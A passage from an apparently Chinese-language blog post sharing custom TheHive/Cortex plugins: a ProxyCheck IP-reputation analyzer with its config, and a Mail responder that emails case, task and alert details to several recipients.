<span class="attr">&quot;service&quot;</span>: <span class="string">&quot;reputation&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;configurationItems&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;key&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;API key for ThreatBook&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;polling_interval&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Define time interval between two requests attempts for the report&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;defaultValue&quot;</span>: <span class="number">60</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ProxyCheck"><a href="#ProxyCheck" class="headerlink" title="ProxyCheck"></a>ProxyCheck</h4><ul>
<li><em><strong>proxycheck.py</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyCheckError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, message</span>):</span></span><br><span class="line">        Exception.__init__(self, message)</span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyCheck</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Threat intelligence: ProxyCheck</span></span><br><span class="line"><span class="string">    http://proxycheck.io/v2/</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.ua = <span class="string">&quot;HappyHunting&quot;</span></span><br><span class="line">        self.session = requests.Session()</span><br><span class="line">        self.url = <span class="string">&#x27;http://proxycheck.io/v2/&#x27;</span></span><br><span class="line">        self.params = &#123;</span><br><span class="line">            <span class="string">&#x27;vpn&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;asn&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;time&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;info&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;risk&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;port&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;seen&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;days&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;tag&#x27;</span>: <span class="string">&#x27;siem&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_request</span>(<span class="params">self, url, params=&#123;&#125;</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Request ProxyCheck API</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: self.ua&#125;</span><br><span class="line">        r = self.session.get(</span><br><span class="line">            url=url,</span><br><span class="line">            params=params,</span><br><span class="line">            headers=headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">raise</span> ProxyCheckError(</span><br><span class="line">                <span class="string">&#x27;Invalid HTTP status code %i&#x27;</span> % r.status_code)</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_proxy</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Checking proxy information from proxycheck.io</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        url = self.url + data</span><br><span class="line">        self.params[<span class="string">&#x27;key&#x27;</span>] = self.key</span><br><span class="line">        results = self._request(url=url, params=self.params)</span><br><span class="line">        <span class="keyword">return</span> self.parser_results(results, data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parser_results</span>(<span class="params">self, r, ioc</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Parsing results</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        intel = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> r[<span class="string">&#x27;status&#x27;</span>] == <span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">            intel = &#123;</span><br><span class="line">                <span class="string">&#x27;ip&#x27;</span>: ioc,</span><br><span class="line">                <span class="string">&#x27;country&#x27;</span>: r[ioc][<span class="string">&#x27;country&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;city&#x27;</span>: r[ioc][<span class="string">&#x27;proxy&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;proxy&#x27;</span>: r[ioc][<span class="string">&#x27;proxy&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;type&#x27;</span>: r[ioc][<span class="string">&#x27;type&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;provider&#x27;</span>: r[ioc][<span class="string">&#x27;provider&#x27;</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> intel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">&#x27;&lt;api_key&gt;&#x27;</span></span><br><span class="line">    proxycheck = ProxyCheck(key)</span><br><span class="line"></span><br><span class="line">    ioc = <span class="string">&#x27;8.8.8.8&#x27;</span></span><br><span class="line">    r = proxycheck.check_proxy(ioc)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>proxycheck_analyzer.py</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> proxycheck <span class="keyword">import</span> ProxyCheck</span><br><span class="line"><span class="keyword">from</span> cortexutils.analyzer <span class="keyword">import</span> Analyzer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyCheckAnalyzer</span>(<span class="params">Analyzer</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        Analyzer.__init__(self)</span><br><span class="line">        self.service = self.get_param(</span><br><span class="line">            <span class="string">&#x27;config.service&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Service parameter is missing&#x27;</span>)</span><br><span class="line">        self.key = self.get_param(</span><br><span class="line">            <span class="string">&#x27;config.key&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Missing ProxyCheck API key&#x27;</span>)</span><br><span class="line">        self.polling_interval = self.get_param(<span class="string">&#x27;config.polling_interval&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        self.proxycheck = ProxyCheck(self.key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">summary</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">        taxonomies = []</span><br><span class="line">        level = <span class="string">&quot;info&quot;</span></span><br><span class="line">        namespace = <span class="string">&quot;ProxyCheck&quot;</span></span><br><span class="line">        predicate = <span class="string">&quot;Proxy&quot;</span></span><br><span class="line">        value = <span class="string">&quot;False&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> raw.get(<span class="string">&quot;proxy&quot;</span>) == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">            level = <span class="string">&quot;suspicious&quot;</span></span><br><span class="line">            value = <span class="string">&quot;True&quot;</span></span><br><span class="line"></span><br><span class="line">        taxonomies.append(self.build_taxonomy(</span><br><span class="line">            level, namespace, predicate, value))</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;taxonomies&quot;</span>: taxonomies&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.service == <span class="string">&#x27;proxycheck&#x27;</span>:</span><br><span class="line">            data = self.get_param(<span class="string">&#x27;data&#x27;</span>, <span class="literal">None</span>, <span class="string">&#x27;Data is missing&#x27;</span>)</span><br><span class="line">            results = self.proxycheck.check_proxy(data)</span><br><span class="line">            self.report(results)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.error(<span class="string">&#x27;Invalid data type&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ProxyCheckAnalyzer().run()</span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>ProxyCheck.json</strong></em></li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProxyCheck&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://github.com/TheHive-Project/Cortex-Analyzers&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;AGPL-V3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get the compromise information of IP from ProxyCheck.&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dataTypeList&quot;</span>: [<span class="string">&quot;ip&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;ProxyCheck/proxycheck_analyzer.py&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;baseConfig&quot;</span>: <span class="string">&quot;ProxyCheck&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;service&quot;</span>: <span class="string">&quot;proxycheck&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;configurationItems&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;key&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;API key for ProxyCheck&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;polling_interval&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Define time interval between two requests attempts for the report&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="number">60</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Responders-插件"><a href="#Responders-插件" class="headerlink" title="Responders - 插件"></a>Responders - 插件</h3><h4 id="Mail"><a href="#Mail" class="headerlink" title="Mail"></a>Mail</h4><p>​    <em>Cortex</em>默认有一个插件（<em>Mailer</em>）负责发送邮件。使用了一下发现比较“坑”，首先不支持对多个收件人的发送，且当选择从<em>Observables</em>中发送邮件时，收件人竟然是<em>mail</em>类型的<em>IoC</em>。。。 WTF！别问我怎么知道的，它源码里就是这么写的。。。所以，自己动手丰衣足食！</p>
<p><strong>主要功能：</strong></p>
<ol>
<li>在原有的基础上新增了批量发送的功能；</li>
<li>新增了支持对<em>task logs</em>数据类型的发送；</li>
<li>发送邮件时会附带当前<em>case</em>或者<em>task</em>的<em>URL</em>，便于收件人快速浏览问题；    </li>
</ol>
<ul>
<li><em>mail.py</em></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> mistune</span><br><span class="line"><span class="keyword">from</span> cortexutils.responder <span class="keyword">import</span> Responder</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mail</span>(<span class="params">Responder</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        Responder.__init__(self)</span><br><span class="line">        self.smtp_host = self.get_param(<span class="string">&quot;config.smtp_host&quot;</span>, <span class="string">&quot;localhost&quot;</span>)</span><br><span class="line">        self.smtp_port = self.get_param(<span class="string">&quot;config.smtp_port&quot;</span>, <span class="string">&quot;25&quot;</span>)</span><br><span class="line">        self.mail_from = self.get_param(</span><br><span class="line">            <span class="string">&quot;config.from&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;Missing sender email address&quot;</span></span><br><span class="line">        )</span><br><span class="line">        self.smtp_user = self.get_param(<span class="string">&quot;config.smtp_user&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        self.smtp_pwd = self.get_param(<span class="string">&quot;config.smtp_pwd&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        self.thehive_url = self.get_param(<span class="string">&quot;config.thehive_url&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_links</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create TheHive links</span></span><br><span class="line"><span class="string">        :rtype: String</span></span><br><span class="line"><span class="string">        :return: URL</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.data_type == <span class="string">&quot;thehive:case&quot;</span>:</span><br><span class="line">            case_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;case id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            url =  self.thehive_url + <span class="string">&quot;/index.html#!/case/&#123;&#125;/details&quot;</span>.<span class="built_in">format</span>(case_id)</span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:case_task&quot;</span>:</span><br><span class="line">            case_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;case id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            task_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;task id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            url =  self.thehive_url + <span class="string">&quot;/index.html#!/case/&#123;&#125;/tasks/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(case_id, task_id)</span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:case_task_log&quot;</span>:</span><br><span class="line">            case_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case_task.case.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;case id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            task_id = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case_task.id&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;task id is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">            url =  self.thehive_url + <span class="string">&quot;/index.html#!/case/&#123;&#125;/tasks/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(case_id, task_id)</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        Responder.run(self)</span><br><span class="line">        <span class="keyword">if</span> self.data_type == <span class="string">&quot;thehive:case_task_log&quot;</span>:</span><br><span class="line">            title = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case_task.title&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;title is missing&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            title = self.get_param(<span class="string">&quot;data.title&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;title is missing&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.data_type <span class="keyword">in</span> [<span class="string">&quot;thehive:case&quot;</span>, <span class="string">&quot;thehive:case_task&quot;</span>]:</span><br><span class="line">            description = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.description&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;case description is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:case_task_log&quot;</span>:</span><br><span class="line">            description = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.message&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;task logs description is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:alert&quot;</span>:</span><br><span class="line">            description = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.case.description&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;alert description is missing&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.error(<span class="string">&quot;Invalid dataType&quot;</span>)</span><br><span class="line"></span><br><span class="line">        mail_to = []</span><br><span class="line">        <span class="keyword">if</span> self.data_type == <span class="string">&quot;thehive:case&quot;</span>:</span><br><span class="line">            <span class="comment"># Search recipient address in case tags</span></span><br><span class="line">            tags = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.tags&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;recipient address not found in tags&quot;</span></span><br><span class="line">            )</span><br><span class="line">            mail_tags = [t[<span class="number">5</span>:] <span class="keyword">for</span> t <span class="keyword">in</span> tags <span class="keyword">if</span> t.startswith(<span class="string">&quot;mail:&quot;</span>)]</span><br><span class="line">            <span class="keyword">if</span> mail_tags:</span><br><span class="line">                mail_to = mail_tags</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.error(<span class="string">&quot;recipient address not found in tags&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> self.data_type <span class="keyword">in</span> [<span class="string">&quot;thehive:case_task&quot;</span>, <span class="string">&quot;thehive:case_task_log&quot;</span>]:</span><br><span class="line">            <span class="comment"># Search recipient address in tasks description</span></span><br><span class="line">            descr_array = description.splitlines()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;mailto:&quot;</span> <span class="keyword">in</span> descr_array[<span class="number">0</span>]:</span><br><span class="line">                mail_str = descr_array[<span class="number">0</span>].replace(<span class="string">&quot;mailto:&quot;</span>, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">                mail_to = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> mail_str.split(<span class="string">&#x27;,&#x27;</span>)]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.error(<span class="string">&quot;recipient address not found in description&quot;</span>)</span><br><span class="line">            <span class="comment"># Set rest of description as body</span></span><br><span class="line">            description = <span class="string">&quot;\n&quot;</span>.join(descr_array[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> self.data_type == <span class="string">&quot;thehive:alert&quot;</span>:</span><br><span class="line">            <span class="comment"># Search recipient address in artifacts</span></span><br><span class="line">            artifacts = self.get_param(</span><br><span class="line">                <span class="string">&quot;data.artifacts&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;recipient address not found in observables&quot;</span></span><br><span class="line">            )</span><br><span class="line">            mail_artifacts = [</span><br><span class="line">                a[<span class="string">&quot;data&quot;</span>] </span><br><span class="line">                <span class="keyword">for</span> a <span class="keyword">in</span> artifacts </span><br><span class="line">                <span class="keyword">if</span> a.get(<span class="string">&quot;dataType&quot;</span>) == <span class="string">&quot;mail&quot;</span> <span class="keyword">and</span> <span class="string">&quot;data&quot;</span> <span class="keyword">in</span> a</span><br><span class="line">            ]</span><br><span class="line">            mail_tags = [</span><br><span class="line">                t[<span class="number">5</span>:]</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> mail_artifacts</span><br><span class="line">                <span class="keyword">if</span> t.startswith(<span class="string">&quot;mail:&quot;</span>)</span><br><span class="line">            ]</span><br><span class="line">            <span class="keyword">if</span> mail_tags:</span><br><span class="line">                mail_to = mail_tags</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.error(<span class="string">&quot;recipient address not found in observables&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg = MIMEMultipart()</span><br><span class="line">        msg[<span class="string">&quot;Subject&quot;</span>] = title</span><br><span class="line">        msg[<span class="string">&quot;From&quot;</span>] = self.mail_from</span><br><span class="line">        msg[<span class="string">&quot;To&quot;</span>] = <span class="string">&#x27;,&#x27;</span>.join(mail_to)</span><br><span class="line">        <span class="comment"># Markdown to HTML</span></span><br><span class="line">        content = mistune.markdown(description, escape=<span class="literal">True</span>, hard_wrap=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># add TheHive Links</span></span><br><span class="line">        links = self.create_links()</span><br><span class="line">        content += <span class="string">&#x27;\n&lt;p&gt;&lt;a href=&quot;&#123;&#125;&quot;&gt;Click me to TheHive&lt;/a&gt;&lt;/p&gt;\n&#x27;</span>.<span class="built_in">format</span>(links)</span><br><span class="line">        msg.attach(MIMEText(content, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.smtp_user <span class="keyword">and</span> self.smtp_pwd:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                context = ssl.create_default_context()</span><br><span class="line">                <span class="keyword">with</span> smtplib.SMTP(self.smtp_host, self.smtp_port) <span class="keyword">as</span> server:</span><br><span class="line">                    server.ehlo()</span><br><span class="line">                    server.starttls(context=context)</span><br><span class="line">                    server.ehlo()</span><br><span class="line">                    server.login(self.smtp_user, self.smtp_pwd)</span><br><span class="line">                    server.send_message(msg, self.mail_from, mail_to)</span><br><span class="line">            <span class="keyword">except</span> smtplib.SMTPNotSupportedError:</span><br><span class="line">                <span class="keyword">with</span> smtplib.SMTP(self.smtp_host, self.smtp_port) <span class="keyword">as</span> server:</span><br><span class="line">                    server.ehlo()</span><br><span class="line">                    server.login(self.smtp_user, self.smtp_pwd)</span><br><span class="line">                    server.send_message(msg, self.mail_from, mail_to)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> smtplib.SMTP(self.smtp_host, self.smtp_port) <span class="keyword">as</span> server:</span><br><span class="line">                server.send_message(msg, self.mail_from, mail_to)</span><br><span class="line"></span><br><span class="line">        self.report(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;message sent&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">operations</span>(<span class="params">self, raw</span>):</span></span><br><span class="line">        <span class="keyword">return</span> [self.build_operation(<span class="string">&quot;AddTagToCase&quot;</span>, tag=<span class="string">&quot;mail sent&quot;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Mail().run()</span><br></pre></td></tr></table></figure>

<ul>
<li><em>Mail.json</em></li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Mail&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;https://github.com/TheHive-Project/Cortex-Analyzers&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;AGPL-V3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Send an email with information from a TheHive case or alert&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dataTypeList&quot;</span>: [<span class="string">&quot;thehive:case&quot;</span>, <span class="string">&quot;thehive:alert&quot;</span>, <span class="string">&quot;thehive:case_task&quot;</span>, <span class="string">&quot;thehive:case_task_log&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;Mail/mail.py&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;baseConfig&quot;</span>: <span class="string">&quot;Mail&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;configurationItems&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;from&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;email address from which the mail is send&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;smtp_host&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;SMTP server used to send mail&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="string">&quot;localhost&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;smtp_port&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;SMTP server port&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;number&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="number">25</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;smtp_user&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;SMTP server user&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;multi&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;defaultValue&quot;</span>: <span class="string">&quot;user&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span 